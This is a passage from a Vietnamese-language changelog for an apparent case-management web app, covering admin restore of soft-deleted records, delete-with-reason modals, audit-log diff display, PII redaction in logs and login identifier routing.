**User report:** "Quản trị có thể khôi phục vụ án đã xóa không?". Trước đây CHƯA — soft delete chỉ set `deletedAt`, không có UI/API restore. Admin phải SSH + UPDATE SQL trực tiếp. Modal delete v0.31.0.2 nói dối ("Quản trị viên có thể khôi phục" — kỹ thuật được, thực tế không có flow).

**Plan v0.32.0.0 passed `/plan-eng-review` (4 findings → all resolved).**

### Added
- **Trang `/admin/khoi-phuc`** (RestorePage) — admin-only, 3 tabs (Vụ án / Vụ việc / Đơn thư), search box, modal khôi phục với:
  - Reason textarea 10-500 ký tự (audit trail)
  - Hiển thị "Lý do xóa gốc" (đối chiếu delete reason với restore reason)
  - Inline error banner (no `window.alert`)
  - Char counter `{n}/500` color-shifted
  - autoFocus + Esc + focus return on close
  - Success banner 5s auto-dismiss
- **API endpoints** (3 entities × 2 endpoints = 6):
  - `GET /api/v1/cases/admin/deleted` — paginated list, enriched delete audit (single batched query, no N+1)
  - `POST /api/v1/cases/:id/restore` body `{ reason }` — transactional với P2025 guard cho concurrent restore
  - Tương tự `/incidents/...` và `/petitions/...`
- **DTOs**: `RestoreCaseDto`, `RestoreIncidentDto`, `RestorePetitionDto` (reason 10-500 chars validation)
- **Permission seed (P1 fix from /plan-eng-review D1)**: `seed-permissions.ts` thêm 3 rows `{action:'restore', subject:'Case'|'Incident'|'Petition'}`. ADMIN tự động được grant qua role-permission mapping. Pre-fix: missing seed → 403 cho cả ADMIN.
- **Audit log actions**: `CASE_RESTORED`, `INCIDENT_RESTORED`, `PETITION_RESTORED` — metadata `{ reason, hoursAfterDeletion, name|code|stt }`.
- **Sidebar menu**: "Khôi phục dữ liệu" trong admin section (icon RotateCcw).

### Changed
- **Delete modal wording (Case + Incident v0.31.0.2)**: cập nhật từ "Quản trị viên có thể khôi phục nếu cần" → "Quản trị viên có thể khôi phục tại trang Khôi phục dữ liệu (/admin/khoi-phuc)" — không còn nói dối UX.

### Tests
- **+15 backend**: 4 cho Cases.restore (R1-R4) + 2 listDeleted (R5-R6) + 4 cho Incidents.restore (R7a-d) + 4 cho Petitions.restore (R8a-d) + 3 cho permission seed (R9 Case/Incident/Petition). Suite: **1448 BE pass**.
- **+4 frontend**: integration tests cho RestorePage (FE-R1 tabs+list, FE-R2 modal+validation, FE-R3 success flow, FE-R4 non-admin block). Suite: **546 FE pass**.

### Architecture decisions (per /plan-eng-review)
- **D1 — Permission seed shipped explicit** (not deferred to manual SQL post-deploy).
- **D2 — Decorator-only auth check** (no hard-coded `if (role !== ADMIN)` duplicate). PermissionsGuard + permission table = single source of truth, future-proof cho admin grant restore cho role khác.
- **D3 — Restore as-is** (status giữ nguyên, không validate status enum, không auto-reset). NOT in scope: status integrity check cho edge case manual SQL hack.
- **D4 — Full test mirror** cho Incident + Petition (4 paths mỗi entity, không phải chỉ 1 happy path).

### NOT in scope (TODOS for v0.32.x+)
- Child entity restore (Subject, Lawyer, Document, Conclusion, Proposal, GuidanceRecord, Exchange, Delegation, CalendarEvent) — 9 entities còn lại. Parent only.
- Cascade restore (children auto-restore khi parent restored) — explicit decision: parent only.
- Bulk restore UI.
- Permission UI để chỉnh `restore` permission cho role khác (assume seeded cố định cho ADMIN).

---

## [0.31.0.2] - 2026-05-21

### Feat: Xóa vụ án với ghi nhận lý do (mirror Incident + autoplan hardening)

**User report:** Tại màn hình Danh sách vụ án không thể xóa data test mới tiếp nhận; cần flow giống Vụ việc — modal ghi nhận lý do trước khi xóa.

**Plan v0.31.0.2 passed `/autoplan` review (CEO + Design + Eng subagents).** 4 CRITICAL fixes absorbed: audit log transactional, FK migration online-safe (NOT VALID + VALIDATE), soft-deleted entity filter trên ALL 5 linked check, status TOCTOU atomic guard.

### Added
- **`Case.createdById` field** (nullable FK → users) — online migration với `NOT VALID + VALIDATE CONSTRAINT` pattern (production lock-free). Legacy rows = NULL → ADMIN-only delete với specific error message.
- **`DELETE /cases/:id` body** `{ reason: string }` — bắt buộc 10-500 ký tự. Mirror `DELETE /incidents/:id` (v0.21.x).
- **`GET /cases/:id/delete-preflight`** — UI pre-flight kiểm tra trạng thái + linked entity counts (subjects/lawyers/conclusions/documents/linkedIncidents) trước khi user nhập lý do. Tiết kiệm round-trip 400.
- **SystemSetting `THOI_HAN_XOA_VU_AN`** (default 72h) — cấu hình thời hạn creator được tự xóa. ADMIN bypass window.
- **Audit log `CASE_DELETED`** wrapped trong `$transaction` với soft delete — guaranteed atomic, no orphan deletion possible.
- **Modal "Xóa vụ án" (frontend)**:
  - Pre-flight blocker banner (red, list 5 entity counts)
  - 4 quick-fill reason chips ("Nhập sai", "Trùng lặp", "Sai phân loại", "Dữ liệu test")
  - Always-visible character counter `{n}/500` (color-shift: red <10, slate 10-480, amber >480)
  - **Inline error banner** (replaces `window.alert`) — modal stays open, reason preserved cho retry
  - **autoFocus textarea + focus return** to triggering ⋮ button on close (keyboard a11y)
  - Esc key closes modal
- **Success banner** ở top trang sau xóa (green, auto-dismiss 5s, click X to dismiss).

### Changed
- **`Case.delete()` service** — refactor từ minimal 6-step sang full 8-step validation chain (mirror `incidents.service.ts:469-563`):
  1. Fetch với linked entity counts (ALL filter `deletedAt:null`)
  2. Status check (only TIEP_NHAN)
  3. 5-entity linked records check (subjects/lawyers/conclusions/documents/linkedIncidents)
  4. Creator-or-admin check (specific NULL message)
  5. Time window check (72h default, ADMIN bypass)
  6. DataScope write-scope check
  7. **Atomic soft delete** với `where:{status:TIEP_NHAN}` (catches P2025 → "đã đổi trạng thái")
  8. **Audit log in same `$transaction`**
- **"Xóa vụ án" button** — visible always trong action menu, disabled với tooltip khi `status !== TIEP_NHAN` (thay vì hide entirely — discoverability). Tooltip giải thích status hiện tại.
- **`Case.create()`** — set `createdById: actorId` cho new cases.

### Removed
- Dialog "Vô hiệu hóa vụ án" cũ (single-action, no reason) — thay bằng full modal trên.

### Tests
- +13 backend (cases.service.spec.ts) — 8-step chain + previewDelete + TOCTOU + DataScope.
- +1 settings spec (`THOI_HAN_XOA_VU_AN` seeded).
- +5 frontend (CaseListPage.test.tsx integration) — status guard, modal autofocus + preflight, inline error (NOT alert), blockers disabled.
- Suite: 1430 BE pass, 542 FE pass.

### Migration safety (prod)
- `ALTER TABLE cases ADD COLUMN createdById TEXT` — PG13+ metadata-only, instant.
- `ADD CONSTRAINT ... FOREIGN KEY ... NOT VALID` — brief ACCESS EXCLUSIVE, no table scan.
- `VALIDATE CONSTRAINT` — SHARE UPDATE EXCLUSIVE, allows concurrent reads/writes.
- `CREATE INDEX` — plain (acceptable vì cases < 10k rows). Tách CONCURRENTLY khi table lớn.

### Deferred to TODOS (4 added)
- P3: Backfill script `Case.createdById` từ audit log lịch sử.
- P2: Test data mode (`isTestData: true` flag bypass 8-step chain for ADMIN).
- P2: Extract `SoftDeleteWithReasonService<T>` base class (trigger khi N=3 entities — Petition next).
- P2: Backport UX deltas (inline error banner, visible disabled, chips, counter, focus) → IncidentListPage delete modal.

---

## [0.31.0.1] - 2026-05-21

### Hot-fix: Action dropdown (⋮) bị clip ở 3 list page — React Portal escape

**User report:** Click button 3 chấm (⋮) ở `/vu-viec` → submenu bị che mất (truncated bởi container cha).

**Root cause:** CSS overflow chain ở 3 list page (IncidentListPage, CaseListPage, PetitionListPage):
- Outer card wrapper `overflow-hidden` (rounded corners + shadow)
- Inner table wrapper `overflow-x-auto` (horizontal scroll)
- CSS spec: khi `overflow-x` là `auto/scroll/hidden`, browser TỰ ÉP `overflow-y` từ `visible` thành `auto` — kể cả explicit `overflow-y: visible` không thoát được
- Inline `absolute z-50` dropdown bị clip bởi cả 2 layer overflow

**Fix:** Render dropdown qua React Portal (`createPortal` to `document.body`) — thoát ALL parent overflow constraints. Industry-standard pattern (Radix, Headless UI, Floating UI dùng).

### Added

- `<ActionMenuPortal>` shared component ([frontend/src/components/ActionMenuPortal.tsx](frontend/src/components/ActionMenuPortal.tsx)) — reusable cho future list pages:
  - State-based anchor prop (`anchor: HTMLElement | null`) — inline JSX trong `.map()`, không cần extract per-row component
  - Auto-position từ `getBoundingClientRect()` của anchor
  - rAF-throttled scroll/resize listener (smooth ở low-end devices)
  - Defensive close khi anchor detached khỏi DOM mid-open
  - Click-outside detection (mousedown listener)
  - Escape key handler
  - z-index 9999 (escape any stacking context)

### Changed

- `IncidentListPage`, `CaseListPage`, `PetitionListPage`: replace inline absolute dropdown JSX bằng `<ActionMenuPortal>` invocation. State `showActionMenu: string` → `openMenu: {id, anchor}`. Click-outside useEffect removed (Portal handles internally).

### Tests (TDD RED → GREEN, +10 new)

- `frontend/src/components/__tests__/ActionMenuPortal.test.tsx` — 8 tests (closed/open/position align right+left/click-outside/menu-item-no-close/Escape/anchor-detached)
- `frontend/src/pages/incidents/__tests__/IncidentListPage.test.tsx` — 2 integration tests (bootstrap new test file): click ⋮ → portal opens, click outside → portal closes

**Suite:** 527 → 537 FE pass + tsc --noEmit clean. Backend unchanged (1413/1413).

### Reference

- Commits trước (prior CSS-only attempts đã fail vì CSS spec):
  - `d81cdbe fix(ui): action dropdown z-20 → z-50 to render above sidebar`
  - `5d6622e fix(ui): action dropdown mở sang phải (left-0) thay vì sang trái`
  - `ef92357 fix(ui): action dropdown left-0 → left-10 to clear ⋮ button column`

### Known follow-up

- **P3:** Smart collision detection — auto flip menu UP nếu near bottom viewport (Floating UI middleware pattern)
- **P3:** Keyboard navigation — ArrowDown/Up navigate menu items + Enter trigger (FKSelect:190-228 đã có pattern, có thể clone)

## [0.31.0.0] - 2026-05-21

### Bổ sung Loại nguồn tin chi tiết — Đ.144 BLTTHS + TT 28/2020/TT-BCA Đ.6

**Background:** Sau v0.30.0.3 (fix `loaiDonVu` enum mismatch), dropdown "Loại nguồn tin" hoạt động với 3 enum chính theo Đ.144 BLTTHS 2015. v0.31.0.0 bổ sung 2 chiều metadata độc lập để đầy đủ theo quy định nhà nước:
- **Nguồn phát tin** (cascading sub-types) — ai gửi tin chi tiết theo từng loại chính
- **Phương thức tiếp nhận** — cách tin được tiếp nhận theo TT28 Đ.6 (5 phương thức)

### Added

- Prisma enum [`NguonPhatTin`](backend/prisma/schema.prisma) — 10 giá trị (cascading từ `LoaiNguonTin`):
  - **TO_GIAC (Đ.144 K1):** `CA_NHAN_TO_GIAC`
  - **TIN_BAO (Đ.144 K2):** `CO_QUAN_NHA_NUOC`, `TO_CHUC`, `CA_NHAN_BAO_TIN`, `PHUONG_TIEN_TRUYEN_THONG`
  - **KIEN_NGHI_KHOI_TO (Đ.144 K3):** `VIEN_KIEM_SAT`, `THANH_TRA`, `KIEM_TOAN`, `TOA_AN`, `CO_QUAN_KHAC`
- Prisma enum [`PhuongThucTiepNhan`](backend/prisma/schema.prisma) — 5 giá trị theo TT 28/2020/TT-BCA Đ.6:
  - `TRUC_TIEP_BANG_LOI`, `TRUC_TIEP_BANG_VAN_BAN`, `DIEN_THOAI`, `BUU_DIEN`, `PHUONG_TIEN_DIEN_TU`
- 2 column nullable trên `Incident`: `nguonPhatTin`, `phuongThucTiepNhan`
- Migration: `20260521094750_add_nguon_phat_tin_phuong_thuc_tiep_nhan` (safe, no backfill)
- Custom DTO validator [`@IsNguonPhatTinMatchLoaiDonVu()`](backend/src/common/validators/nguon-phat-tin-match.validator.ts) — defense in depth: BE reject (400) nếu cặp `(loaiDonVu, nguonPhatTin)` mismatch (vd `TIN_BAO + VIEN_KIEM_SAT`). Bypass UI cũng không qua được.
- Frontend constants & helper trong [`status-labels.ts`](frontend/src/shared/enums/status-labels.ts):
  - `NGUON_PHAT_TIN_LABEL` (10 entries) + `NGUON_PHAT_TIN_BY_LOAI` (cascading map)
  - `getNguonPhatTinOptions(loaiDonVu)` — pure helper, internal guard (no cast at call site)
  - `PHUONG_THUC_TIEP_NHAN_LABEL` + `PHUONG_THUC_TIEP_NHAN_OPTIONS`
- 2 FKSelect mới trong [`IncidentFormPage.tsx`](frontend/src/pages/incidents/IncidentFormPage.tsx) section "Tiếp nhận nguồn tin"
- useEffect cascading auto-reset: khi user đổi `loaiDonVu`, `nguonPhatTin` tự reset nếu value không thuộc group mới

### Changed

- [`generate-shared-enums.cjs`](backend/scripts/generate-shared-enums.cjs) — whitelist thêm `NguonPhatTin`, `PhuongThucTiepNhan` (27 enums shared, +2)

### Tests (TDD RED → GREEN, 16 new tests)

- Backend [`nguon-phat-tin-match.validator.spec.ts`](backend/src/common/validators/__tests__/nguon-phat-tin-match.validator.spec.ts) — 10 tests cover happy paths + 3 mismatch + skip rules
- Backend [`incidents.service.spec.ts`](backend/src/incidents/incidents.service.spec.ts) — +1 test (91/91 pass): create persists cả 2 field
- Frontend [`IncidentFormPage.test.tsx`](frontend/src/pages/incidents/__tests__/IncidentFormPage.test.tsx) — +9 tests:
  - Test 4: cascading visible options (TIN_BAO → 4)
  - Test 5: auto-reset khi đổi loaiDonVu (TIN_BAO+TO_CHUC → TO_GIAC clears)
  - Test 6: phương thức submit payload DIEN_THOAI
  - Test 7: edit-mode load preserve cả 2 field
  - Test 8 (5 sub-tests): `getNguonPhatTinOptions` helper pure function unit tests

**Suite totals:** Backend 1413/1413 + Frontend 527/527 pass + tsc --noEmit clean.

### Known follow-up (TODOS)

- **P2:** Hiển thị 2 field mới trong IncidentListPage table + filter
- **P3:** Excel export TT28 thêm 2 cột (template Excel TDC)

### Reference

- Điều 144 BLTTHS 2015 — định nghĩa tố giác / tin báo / kiến nghị khởi tố
- Thông tư 28/2020/TT-BCA Điều 6 — 5 phương thức tiếp nhận nguồn tin

## [0.30.0.3] - 2026-05-20

### Hot-fix: loaiDonVu enum mismatch — form "Thêm vụ việc mới" submit thành công

**User report:** sau khi deploy v0.30.0.2 (error parsing fix), anh thấy được error THẬT: `loaiDonVu phải là TO_GIAC, TIN_BAO hoặc KIEN_NGHI_KHOI_TO`. Form không submit được khi chọn "Loại nguồn tin (Điều 144 BLTTHS)".

**3 lớp lỗi xếp chồng:**
1. **Frontend hook trả label thay vì code** — `useDirectoryOptions.ts:26` default returns `{value: d.name}` (Vietnamese label) thay vì `d.code`.
2. **Seed directory codes lệch enum** — `seed-directory-types.ts:111-115` dùng `TO_GIAC_CA_NHAN`, `TIN_BAO_CO_QUAN` (long codes) trong khi Prisma enum `LoaiNguonTin` chỉ có `TO_GIAC`, `TIN_BAO`, `KIEN_NGHI_KHOI_TO`.
3. **Sai kiến trúc** — "Loại nguồn tin" là enum BLTTHS 2015 cố định (3 căn cứ), không phải user-managed taxonomy → không nên đi qua directory lookup.

### Added
- `LOAI_NGUON_TIN_LABEL` + `LOAI_NGUON_TIN_OPTIONS` ở [frontend/src/shared/enums/status-labels.ts](frontend/src/shared/enums/status-labels.ts) — labels Việt theo Đ.144 khoản 1a/1b/1c, derive options từ Prisma enum (DRY pattern khớp `LY_DO_KHONG_KHOI_TO_OPTIONS`).
- Test file [frontend/src/pages/incidents/__tests__/IncidentFormPage.test.tsx](frontend/src/pages/incidents/__tests__/IncidentFormPage.test.tsx) — 3 tests (regression guard: enum value vs label, options visible, omit khi không chọn).

### Changed
- [IncidentFormPage.tsx:334-342](frontend/src/pages/incidents/IncidentFormPage.tsx#L334-L342) — FKSelect cho `loaiDonVu` swap prop `directoryType="TDC_SOURCE"` → `options={LOAI_NGUON_TIN_OPTIONS}`. Nhất quán pattern với `lyDoKhongKhoiTo` cùng file (line 499-507).

### Fixed
- **Bonus FKSelect type=button fix** — Option buttons, clear button, create-new button trong [FKSelect.tsx](frontend/src/components/FKSelect.tsx) trước đây thiếu `type="button"` → click trong `<form>` mặc định submit form. Trước đây dormant với `lyDoKhongKhoiTo` vì user hiếm chọn rồi click ngay. Discovered khi viết regression test.

### Removed
- 4 entries TDC_SOURCE khỏi seed code [backend/prisma/seed-directory-types.ts:111-115](backend/prisma/seed-directory-types.ts#L111-L115) — không còn UI tham chiếu. Orphan rows trong prod DB defer cleanup (P3 TODO).

### Tests
- Frontend: 515 → 518 (+3 new). 518/518 pass, tsc --noEmit clean.
- Backend: 90/90 incidents.service tests pass (DTO không đổi).

### Known follow-up
- Hook `useDirectoryOptions.ts:26` default returning label thay vì code — footgun latent (P2 TODO). Audit FKSelect+directoryType callsites trước khi thay default.
- Prod DB còn 4 row orphan `directory_entries WHERE type='TDC_SOURCE'` (cosmetic, P3 TODO).
- Generator script `gen-enums.ts` chưa auto-emit `*_OPTIONS` arrays — manual setup tiếp tục cho enum dropdowns (P3 TODO).

## [0.30.0.2] - 2026-05-20

### Hot-fix: Centralize API error parsing (UX visibility)

**User report:** "thêm vụ việc mới phát sinh lỗi" — toast hiển thị "Có lỗi xảy ra" mỗi lần API fail, người dùng không biết lỗi thật là gì.

**Root cause:** `backend/src/common/filters/http-exception.filter.ts:42-51` wrap mọi error response thành `{ success: false, error: { code, message, details } }`. 30 file frontend lại đọc thẳng `response.data.message` → luôn `undefined` → fallback "Có lỗi xảy ra". Mọi error message thật (validation, FK violation, BLTTHS check, conflict, 2FA mandate, deadline rule missing, ...) đều bị nuốt mất.

### Added
- `frontend/src/lib/api-errors.ts` — single source of truth `extractApiError(err, fallback)`:
  - Đọc đúng `data.error.message` + expand `details[]` thành messages array (cho ValidationPipe arrays)
  - Legacy NestJS shape (`data.message: string|string[]`) vẫn hoạt động (defensive backwards-compat)
  - Network error (no response) → message Việt rõ ràng
  - Trả `{ message, messages, code, status }` — frontend dùng `.message` cho toast/alert, `.messages` cho form-level error list, `.status` cho special-case (401/403/429)
- `frontend/src/lib/__tests__/api-errors.test.ts` — 8 unit tests cover wrapped/legacy/network/raw

### Changed
- Refactor 30 file FE dùng `extractApiError()` thay 38 chỗ inline parsing:
  - **Forms:** IncidentFormPage, PetitionFormPage, ChangePasswordModal, AssignModal, CreateEventModal, RecurringDeleteDialog
  - **Lists:** IncidentListPage (3 sites: delete + status change + prosecute), PetitionListPage (×2: convert variants)
  - **Auth:** LoginPage, TwoFaPage, EnrollPage, ForgotPasswordPage, FirstLoginChangePasswordPage, TwoFaSetupModal
  - **Admin:** UserManagementPage (×3), DirectoriesPage (×2), MasterClassPage, ProposeDeadlineRulePage, VersionDecisionPage
  - **Cases:** CaseDetailPage (×3), CaseFormPage/tabs, CaseTdcBackfillPage, VksMeetingsTab, ActionPlanTab, TdcBackfillBanner
  - **Misc:** BulkImportWizard (×2), DashboardPage (giữ logic 403 → 'no-team'), Settings modules (Address/EventCategories/Shortcuts)
- Net diff: +299 / -169 lines (giảm 55 dòng nhờ DRY)

### Fixed
- Toast "Có lỗi xảy ra" giờ chỉ xuất hiện khi backend thật sự không trả message (network down, CORS, etc.) — không còn che mọi error message hợp lệ
- DashboardPage 403 handling vẫn dẫn đến state `'no-team'` (preserve special-case behavior)

### Tests
- Frontend: 247 → 255 (+8 new from api-errors.test.ts). 515/515 pass, tsc --noEmit clean.
- Backend: unchanged (936 tests)

### Known Follow-up (out of scope)
- Underlying bug thực sự làm POST /incidents fail trong môi trường anh user vẫn chưa biết — chỉ sau khi deploy bản này anh user sẽ thấy được error message thật để fix tiếp.

## [0.30.0.1] - 2026-05-20

### Hot-fix: Audit diff fields missing + Date corruption + UX

**User report:** sau khi deploy v0.30.0.0, mở row USER_UPDATED → vẫn không thấy giá trị cũ/mới.

**3 root causes phát hiện qua inspect DB row mới nhất (`2fe513f1`):**

1. **`userSelect` thiếu fields `workId, phone, departmentId`** → khi admin đổi 1 trong 3 field này, cả `before` và `after` snapshot đều KHÔNG có field đó → diff rỗng. Fix: expand `userSelect` cover tất cả editable fields.

2. **`updatedAt` bị corrupt thành `{}`** trong audit metadata → `sanitizeMetadataRecursive` treat `Date` như plain object (`typeof === 'object'`) và `Object.entries(date) === []` → empty object. Fix: detect `Date instanceof` → `toISOString()`.

3. **Legacy badge fires sai** cho row mới nhưng user save không đổi gì (before === after → diff = []). Fix: distinguish via `metadata.fields` key:
   - `metadata.fields` exists → "Bản ghi cũ (trước v0.30)" badge (xám)
   - `metadata === null` + diff rỗng → "Người dùng đã lưu nhưng không thay đổi giá trị nào" badge (xanh thông tin)

**Tests:** +2 backend Date serialization tests. Total 1396→**1402** PASS. Frontend 507 PASS.

## [0.30.0.0] - 2026-05-20

### Fix: Audit diff inline display "Field: old → new"

**Bug user reported:** Trên `/activity-log`, click row UPDATE → modal KHÔNG hiện diff "giá trị cũ → giá trị mới". User muốn format inline `Tên: Nguyen → Nguyễn` (mỗi field 1 dòng).

**Root cause:** 4 services log audit metadata với shape sai → `computeFieldDiff()` trả `[]` rỗng:
- `AdminService.updateUser`: `metadata: { fields: Object.keys(data) }` — chỉ field names, không có before/after values.
- `CasesService.update`, `IncidentsService.update`, `PetitionsService.update`: `metadata: { before: { status, name, investigatorId, assignedTeamId }, after: dto }` — partial subset 4 fields + after là DTO (chỉ field user gửi), miss 15+ fields.

**Backend fix — 4 services refactor sang `audit.wrapUpdate()`:**
- `admin.service.ts`: Non-reset branch dùng `wrapUpdate` (preserve `$transaction` + optimistic lock). Reset branch (`ADMIN_PASSWORD_RESET`) giữ nguyên direct `audit.log` (incompatible với `updateMany` return type).
- `cases.service.ts`: `CASE_UPDATED` qua `wrapUpdate` với full Case include. Preserve `try/catch (P2025) → ConflictException`. KEEP `CASE_STATUS_CHANGED` + `PETITION_AUTO_CREATED` audit (different actions, history value).
- `incidents.service.ts`: `INCIDENT_UPDATED` qua `wrapUpdate`. Preserve P2025 translation.
- `petitions.service.ts`: `PETITION_UPDATED` qua `wrapUpdate`. Preserve P2025 translation.

**Frontend (inline diff display):**
- `audit-field-labels.ts` (NEW): 80+ Vietnamese labels cho User/Case/Incident/Petition fields (firstName→"Họ", workId→"Mã cán bộ", status→"Trạng thái", etc.). Fallback raw field name.
- `ActivityLogPage.tsx` modal:
  - Replace 3-column table với **inline list** `Field: oldValue → newValue` + border-left color (xanh added, đỏ removed, vàng modified).
  - Auto-detect long values (>60 chars) → stacked layout (label trên, old block / arrow / new block).
  - `formatAuditValue()` helper: null/'' → "—", object → JSON.stringify.
  - **Legacy badge** cho pre-v0.30 UPDATE rows (no before/after): "Bản ghi cũ (trước v0.30) — không có chi tiết thay đổi" thay vì raw JSON.

**TDD discipline:**
- 3 cycles RED → GREEN, mỗi service refactor có spec test mới assert `wrapUpdate` được call với fetchFn + updateFn (không phải `audit.log` direct).
- 23 new frontend tests cho audit-field-labels (coverage check + per-resource categories + fallback).

**Tests:** Backend 1396 → **1400** PASS (+4). Frontend 484 → **507** PASS (+23). `tsc --noEmit` clean cả 2.

**Plan agent review applied (4 critical findings, all addressed):**
1. C1 — KHÔNG wrap resetPassword path (incompatible với optimistic lock + updateMany).
2. C2 — KEEP `PETITION_AUTO_CREATED` + `CASE_STATUS_CHANGED` audits (chỉ replace `CASE_UPDATED`).
3. C3 — `wrapUpdate` OWNS updateFn → P2025 try/catch wrap quanh `wrapUpdate` call.
4. C4 — Chấp nhận noise duplicate field `status` trong CASE_UPDATED diff (history table có giá trị riêng).

**Risks accepted:**
- +1 SELECT mỗi UPDATE (4 services × ~100 updates/day = 400 extra SELECTs/day — negligible).
- Existing pre-v0.30 audit rows không có diff → legacy badge fallback (no backfill).
- audit_logs.metadata size tăng ~5KB/row cho Case/Incident với ~30 fields (acceptable trong audit budget).

**No DB migration** — pure code change, safe rollback via revert.

## [0.29.0.0] - 2026-05-20

### Audit Log UI Refactor + PII Sanitize + Expanded Coverage

/autoplan dual voices (Codex + Claude subagent) verdict BLOCK → plan rewritten. Refactor existing `/activity-log` UI thay vì duplicate route, sanitize PII at write (passwordHash/refreshTokenHash/totpSecret/backupCodes/etc.) + backfill scrub existing audit_logs metadata, expand audit coverage cho TeamsService (before/after diff) + SettingsService (SETTING_UPDATED), DTO-validated query params, free-text search, CSV export với formula injection protection.

**Backend (audit hardening):**
- `audit.utils.ts` (NEW): `sanitizePII()` regex-based skip pattern `/(hash|secret|token|password|backup_?code|recovery|otp_?code|2fa)/i` (future-proof không phải literal list); `computeFieldDiff()` pure function classify added/removed/modified, skip PII + meta fields.
- `audit.service.ts`:
  - `wrapUpdate()` apply `sanitizePII` TRƯỚC khi log → PII never lands in DB.
  - `wrapUpdate()` accept `tx?: Prisma.TransactionClient` → atomic fetch+update+log.
  - `findAll()` orderBy DESC (fix v0.28 bug 'asc'), clamp `limit ∈ [1,100]` + `offset ≥ 0`, attach `changedFields[]` per row, strip raw before/after from list response.
  - Add `findById()` for detail modal, `distinctActions()` + `distinctSubjects()` for filter dropdowns.
- `audit.controller.ts`: `QueryAuditLogsDto` (class-validator), new endpoints: `GET /audit-logs/:id`, `/actions`, `/subjects`, `/export.csv` (streaming, formula sanitization OWASP, audit-of-export).
- `teams.service.ts`: TEAM_UPDATED giờ dùng `wrapUpdate` capture before/after (was: `{ changes: dto }` only).
- `settings.service.ts`: `updateValue()` thêm audit `SETTING_UPDATED` với before/after value.
- `settings.controller.ts`: pass actorId + ipAddress + userAgent xuống service.
- `settings.module.ts`: import AuditModule.

**Migration (backfill + index):**
- `20260520120000_audit_pii_sanitize_backfill`: idempotent UPDATE strip PII keys khỏi existing `audit_logs.metadata.before/after`. Meta-audit insert `AUDIT_PII_BACKFILL` row tracking migration.
- `20260520121000_audit_jsonb_search_index`: `CREATE EXTENSION pg_trgm`; GIN trigram index `metadata::text gin_trgm_ops` cho search ILIKE; composite `(subject, subjectId, createdAt DESC)` cho forensic timeline. Without CONCURRENTLY (Prisma tx limitation, ~1k rows acceptable).

**Frontend (refactor existing /activity-log):**
- `ActivityLogPage.tsx`:
  - Fix backend param mismatch: `fromDate` → `dateFrom`, `toDate` → `dateTo`.
  - Pass `search` query đến backend (escaped %/_).
  - Display `changedFields[]` từ API response — table với màu (xanh=added, đỏ=removed, vàng=modified). Old value strikethrough khi modified.
  - Raw JSON metadata view collapsible (fallback cho actions không phải before/after pair).
- LogEntry type extends với `changedFields?: ChangedField[]`.

**Tests:**
- `audit.utils.spec.ts` (NEW): 13 cases — PII_PATTERN regex, sanitizePII null/undefined/flat object, computeFieldDiff added/removed/modified/skip-PII/skip-meta/nested.
- `audit.service.spec.ts` (NEW): 13 cases — log() + tx, wrapUpdate sanitize + tx, findAll orderBy desc + clamps + dateRange + changedFields + search escape.
- Updated `settings.service.spec.ts` + `settings.controller.spec.ts` cho new AuditService dependency + actor params.
- Updated `teams.service.spec.ts` mockAudit.wrapUpdate stub.
- Updated `audit.controller.spec.ts` cho DTO-based query.

Backend 1367 → **1392 PASS** (+25 cases). Frontend 484/484 unchanged. TS clean cả 2 stack.

**Security hardening summary (addressing /autoplan critical findings):**
1. PII sanitize at write + backfill scrub existing → ILIKE search KHÔNG match hash/token/secret.
2. PII regex pattern covers `*hash`, `*secret`, `*token`, `*password`, `*backupCode`, `*recovery`, `*otpCode`, `*2fa` — future-proof.
3. DTO clamps limit/offset → DoS protection + NaN safety.
4. Search input escape `%`/`_` → wildcard injection bypass blocked, cap 200 chars.
5. CSV formula injection sanitization (prefix `'` cho `=`/`+`/`-`/`@`/tab/CR) → Excel formula execution blocked.
6. Authorization remains admin-only `read:AuditLog` phase 1 (defer per-team DataScope to v0.30).
7. Audit-of-export logs `AUDIT_LOG_EXPORTED` action with rowCount + filters.

**Out of scope (defer v0.30):** Audit log retention/archive, DataScope per-team audit visibility, full real-time WebSocket stream, alert rules, schema-evolution field rename handling, mobile responsive UI, label generation from Prisma `///` comments.

## [0.28.0.0] - 2026-05-20

### workId Pure-Digit Support — Login bằng Mã cán bộ thuần số

Bug discovered sau khi anh set workId = `33445433` (8 chữ số) cho admin trên prod: login bằng `33445433` trả 401. Root cause: classifier (v0.27) chỉ accept workId shape có dấu `-` (`XXX-XXX` hoặc `PREFIX-PREFIX-NNN`); pure-digit không match → fallback route to username field → admin không có username `33445433` → 401. Thực tế Mã cán bộ ngành công an là thuần số độ dài tùy ý — classifier cần expand.

**Backend (3 files):**
- `identifier-classifier.ts`: thêm `WORKID_DIGITS_PATTERN = /^\d{3,8}$/` route pure-digit 3-8 chars → workId field (an toàn không collision phone, yêu cầu ≥9 digits sau normalize).
- `auth.service.ts` login flow: defensive **workId fallback chain** — nếu classifier route `phone` hoặc `username` mà primary query miss, thử workId field 1 lần trước khi reject. Handle edge case workId 9+ digits (trùng shape phone) hoặc identifier không xác định. KHÔNG fallback khi `field=email` (email shape rõ ràng).
- `create-user.dto.ts`: username regex thêm negative lookahead `^(?!^\d+$)[a-z0-9_]+$` — cấm username thuần số (defense-in-depth chống collision Mã cán bộ shape).

**Tests:**
- New: `create-user.dto.spec.ts` (7 cases) — username thuần số rejected, alphanumeric mix accepted.
- Extended: `identifier-classifier.spec.ts` — 6 cases pure-digit boundaries (3 chars min, 8 chars max, 9+ digits → phone wins).
- Extended: `auth.service.spec.ts` — 3 cases fallback chain (phone miss → workId, username miss → workId, email KHÔNG fallback).

Backend 1351 → **1367 PASS** (+16 cases). Frontend 484 unchanged. TS clean cả 2 stack.

**Routing rules sau v0.28:**
1. `<local>@<domain>` → email
2. `XXX-XXX` hoặc `PREFIX-PREFIX-NNN` → workId
3. **`\d{3,8}` (pure digit 3-8 chars) → workId** (NEW)
4. `\+?[0-9]{9,15}` (≥9 digits) → phone (canonicalize +84)
5. Everything else → username (fallback)
6. Fallback chain (service-side): phone/username miss → thử workId trước khi 401

**Manual QA cần test sau deploy:**
- Login workId `33445433` (admin) → success.
- Login workId `277-794` / `PC02-DTV-001` → success (regression).
- Login phone `0934314279` → success (không bị workId precedence steal).
- Tạo user mới với username `12345` → bị reject ở admin form.

## [0.27.0.0] - 2026-05-19

### Multi-field Login Unblock + Security Hardening + Canonicalization

